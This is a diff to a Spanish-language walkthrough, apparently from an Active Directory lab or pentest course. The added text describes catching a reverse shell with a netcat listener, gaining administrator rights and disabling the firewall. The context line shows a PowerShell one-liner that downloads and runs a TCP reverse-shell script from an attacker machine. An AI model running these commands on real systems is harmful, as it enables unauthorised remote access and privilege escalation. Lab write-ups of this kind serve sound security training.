@@ -92,4 +92,11 @@ Con este usuario se nos permite modificar un proyecto existente, en la modificac
 powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
 ```
 
-Una vez introducida la revrse she
+Una vez introducida la reverse shell, guardaremos y ejecutaremos *netcat* en nuestra maquina atacante escuchando en el puerto *1339*
+```shell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
+```
+
+Esperaremos recibir la conexión, entonces nuestro usuario pertenecerá al grupo administradores y podemos desactivar el firewall
+
+Despues deveremos ejecutar un servidor web usando *HSF.exe* 
